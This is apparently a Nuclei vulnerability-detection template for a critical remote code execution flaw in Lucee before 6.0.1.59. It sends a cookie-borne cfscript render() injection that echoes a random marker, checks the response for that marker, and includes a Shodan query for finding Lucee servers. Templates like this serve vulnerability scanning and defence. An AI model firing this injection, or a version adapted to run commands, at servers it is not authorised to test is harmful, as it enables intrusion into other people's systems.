http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "{{randstr}}")
    - contains(header, "cfid")
    - contains(header, "cftoken")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Cookie: CF_CLIENT_=render(''<cfscript>writeoutput(ToBinary("{{base64(''{{randstr}}'')}}"))</cfscript>'');
    CF_CLIENT_LUCEE=render(''<cfscript>writeoutput(ToBinary("{{base64(''{{randstr}}'')}}"))</cfscript>'');

    '
id: lucee-rce
info:
  author: rootxharsh,iamnoooob,pdresearch
  metadata:
    max-request: 1
    shodan-query: http.title:"Lucee"
    verified: true
  name: Lucee < 6.0.1.59 - Remote Code Execution
  reference:
  - https://blog.projectdiscovery.io/hello-lucee-let-us-hack-apple-again
  severity: critical
  tags: lucee,rce,oast
